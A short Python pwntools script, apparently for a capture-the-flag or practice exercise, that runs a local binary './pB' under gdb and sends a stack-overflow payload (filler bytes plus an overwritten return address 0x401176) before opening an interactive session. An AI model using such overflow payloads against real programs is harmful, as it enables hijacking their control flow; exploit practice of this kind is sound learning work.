#!/usr/bin/env python
# coding=utf-8
from pwn import *

r = gdb.debug('./pB', '''
    break main
    continue
    break *0x401176
    ''')


# EXPLOIT CODE GOES HERE

targer_address = p64(0x0000000000401176)

args = p64(0xCAFECAFECAFECAFE)

r.sendline(args * 3 + targer_address)
r.interactive()
